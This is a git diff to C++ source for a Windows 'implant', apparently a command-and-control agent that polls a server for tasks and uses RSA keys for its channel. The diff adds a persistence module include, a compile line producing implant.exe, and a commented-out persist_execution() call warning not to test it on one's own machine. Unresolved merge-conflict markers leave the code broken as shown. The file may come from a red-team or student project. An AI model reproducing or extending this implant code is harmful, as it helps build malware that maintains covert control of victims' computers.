@@ -9,6 +9,11 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <winhttp.h>
 #include <future>
 #include <cmath>
+
+#include "persist.h"
+
+// current compile line is - g++ implant.cpp persist.cpp -lwinhttp -lbscrypt -static -o implant.exe
+
 #define SERVERNAME "placeholder"
 #define SLEEP 60000
 #define serverpublickey "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzx4uIFIDB0pWvgR/JxYiS1CFOgxV4zWWprRE/Te48cZSC49SHXAya/gKIHO66/7I1yFNiuLhcqtuDx2Pt1fSK1Hw2neXkFRnbGDJXLkGldGe+7Uqjw1XrTT24QXRjAFE/jmVm3FtvrsHloSQZO5mvrHOzHsd+AH4i/HK3rDQ7U6vgQfroPpShD2mK6HPYsQxHTTiz+SMGD3VpG49aUk7YLxR2pfVA/x7vo7MLXDwYI2znwMcu0C5MweN4f7x7C0aop6qFQZVef1/2TbdeSEdri6oWAkwFWA8PCiQaIXvrnjOgm4zMDtFE3CHbcl335ArDQoeCPdeFjIIubGOlUfmAFHJ7Xntb/q2mgDz3VZ9ox7Jzd/ZktrODVyO8VTL3Wt4nQx48fSNU8bWfrTlrKmXwA/2+mvhNjFBRF6R5a7JztsrZkQ1Y1FbMstkw1+Q80mLsLowAfE2VerKjCd7484XXpDtvEdaPkPiYgfRTotrhkkpkcKlLCvdArbNxDnkv328= sumthing"
@@ -27,8 +32,13 @@ void tasks()
     }
 }
 
+<<<<<<< HEAD
 BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput, ULONG pbinputsize)
 {
+=======
+
+BCRYPT_KEY_HANDLE importrsakey(PUCHAR pbinnput,ULONG pbinputsize){
+>>>>>>> bb2b4918e5d63fa8e3a9d5e24a00d5e506b3bbe2
     BCRYPT_ALG_HANDLE rsahandle;
     BCryptOpenAlgorithmProvider(&rsahandle, BCRYPT_RSA_ALGORITHM, NULL, 0);
     BCRYPT_KEY_HANDLE outro = new BCRYPT_KEY_HANDLE;
@@ -238,6 +248,9 @@ void runLoop(int implant_id)
     BCRYPT_KEY_HANDLE symkey=newsymkey(rsakey);
     //char* encbuffer=rsaEncrypt(rsakey,);
     //register()
+    //PERSISTANCE ONCE IMPLANT HAS BEEN MADE
+    // PREFERABLY DO NOT TEST THIS ON YOUR MACHINE
+    //persist_execution();
     while (true)
     {
         try
